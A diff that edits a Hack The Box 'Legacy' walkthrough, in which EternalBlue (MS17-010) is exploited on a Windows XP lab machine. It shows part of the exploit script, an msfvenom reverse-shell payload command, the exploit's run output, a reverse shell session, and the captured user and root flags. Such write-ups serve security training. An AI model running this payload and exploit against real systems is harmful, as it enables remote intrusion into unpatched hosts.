@@ -107,11 +107,11 @@ Host script results:
 Nmap done: 1 IP address (1 host up) scanned in 53.77 seconds
 ```
 
-It seems like this machine is vulnerable to the famous EternalBlue :D
+This machine is vulnerable to `EternalBlue`.
 
 # Exploitation
 
-Let’s search for some possible exploitations using `searchsploit`!
+Let’s search for some possible exploitations using `searchsploit`.
 
 ```bash
 ┌──(root💀shiro)-[/home/shiro]
@@ -129,9 +129,7 @@ Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Executi
 Shellcodes: No Results
 ```
 
-It seems like none of this will work because our machine is running on `Windows XP`…
-
-A quick Google search brings us to this [Github](https://github.com/helviojunior/MS17-010) repository.
+It seems like none of this will work because our machine is running on `Windows XP`. A quick Google search brings us to this [Github](https://github.com/helviojunior/MS17-010) repository. The script we are interested in is the `send_and_execute.py`.
 
 ```bash
 ┌──(root💀shiro)-[/home/shiro/HackTheBox/Legacy]
@@ -139,18 +137,8 @@ A quick Google search brings us to this [Github](https://github.com/helviojunior
 ┌──(root💀shiro)-[/home/shiro/HackTheBox/Legacy]
 └─# cd MS17-010                                                                                 
 ┌──(root💀shiro)-[/home/shiro/HackTheBox/Legacy/MS17-010]
-└─# ls
-BUG.txt                  eternalblue_poc.py       eternalromance_leak.py  eternalsynergy_poc.py  npp_control.py       zzz_exploit.py
-checker.py               eternalchampion_leak.py  eternalromance_poc2.py  infoleak_uninit.py     README.md
-eternalblue_exploit7.py  eternalchampion_poc2.py  eternalromance_poc.py   mysmb.py               send_and_execute.py
-eternalblue_exploit8.py  eternalchampion_poc.py   eternalsynergy_leak.py  mysmb.pyc              shellcode
-```
+└─# cat send_and_execute.py
 
-The script we are interested in is the `send_and_execute.py`.
-
-According to the script, we need to send a file to the target.
-
-```python
 def send_and_execute(conn, arch):
 	smbConn = conn.get_smbconnection()
 
@@ -167,49 +155,17 @@ def send_and_execute(conn, arch):
 	service_exec(conn, r'cmd /c c:\%s' % filename)
 ```
 
-So let’s use this `msfvenom` [cheatsheet](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/) to create a payload!
+Created a payload with `msfvenom` and run the exploit script.
 
 ```bash
 ┌──(root💀shiro)-[/home/shiro/HackTheBox/Legacy/MS17-010]
 └─# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=1234 -f exe > legacy.exe
-```
 
-Now, let’s open a netcat listener and execute the script OwO
-
->   Note: if you are having trouble sending executing the python script, run this [pimpmykali](https://github.com/Dewalt-arch/pimpmykali) script to fix your issue UwU
-
-```bash
 ┌──(root💀shiro)-[/home/shiro/HackTheBox/Legacy/MS17-010]
 └─# python send_and_execute.py 10.10.10.4 legacy.exe                     
 Trying to connect to 10.10.10.4:445
 Target OS: Windows 5.1
-Using named pipe: browser
-Groom packets
-attempt controlling next transaction on x86
-success controlling one transaction
-modify parameter count to 0xffffffff to be able to write backward
-leak next transaction
-CONNECTION: 0x8211c9f8
-SESSION: 0xe107bc18
-FLINK: 0x7bd48
-InData: 0x7ae28
-MID: 0xa
-TRANS1: 0x78b50
-TRANS2: 0x7ac90
-modify transaction struct for arbitrary read/write
-make this SMB session to be SYSTEM
-current TOKEN addr: 0xe21e0998
-userAndGroupCount: 0x3
-userAndGroupsAddr: 0xe21e0a38
-overwriting token UserAndGroups
-Sending file Y3WFFT.exe...
-Opening SVCManager on 10.10.10.4.....
-Creating service DufB.....
-Starting service DufB.....
-The NETBIOS connection with the remote host timed out.
-Removing service DufB.....
-ServiceExec Error on: 10.10.10.4
-nca_s_proto_error
+...
 Done
 
 ┌──(root💀shiro)-[/home/shiro]
@@ -219,33 +175,11 @@ connect to [10.10.14.3] from (UNKNOWN) [10.10.10.4] 1032
 Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.
 
-C:\WINDOWS\system32>cd ../..   	
-
-C:\>dir
-16/03/2017  07:30 ��                 0 AUTOEXEC.BAT
-16/03/2017  07:30 ��                 0 CONFIG.SYS
-16/03/2017  08:07 ��    <DIR>          Documents and Settings
-07/02/2022  04:28 ��            73.802 ESQL0Q.exe
-29/12/2017  10:41 ��    <DIR>          Program Files
-07/02/2022  03:44 ��    <DIR>          WINDOWS
-07/02/2022  04:25 ��            73.802 Y3WFFT.exe
-
-C:\>cd Documents and Settings
-C:\Documents and Settings>dir
-16/03/2017  08:07 ��    <DIR>          .
-16/03/2017  08:07 ��    <DIR>          ..
-16/03/2017  08:07 ��    <DIR>          Administrator
-16/03/2017  07:29 ��    <DIR>          All Users
-16/03/2017  07:33 ��    <DIR>          john
-
-C:\Documents and Settings>cd john
-C:\Documents and Settings\john>cd Desktop
+C:\WINDOWS\system32>cd "C:\Documents and Settings\john\Desktop"
 C:\Documents and Settings\john\Desktop>type user.txt
 e69af0e4f443de7e36876fda4ec7644f
 
-C:\Documents and Settings\john\Desktop>cd ../../
-C:\Documents and Settings>cd Administrator
-C:\Documents and Settings\Administrator>cd Desktop
+C:\Documents and Settings\john\Desktop>cd "C:\Documents and Settings\Administrator\Desktop"
 C:\Documents and Settings\Administrator\Desktop>type root.txt
 993442d258b0e0ec917cae9e695d5713
 ```
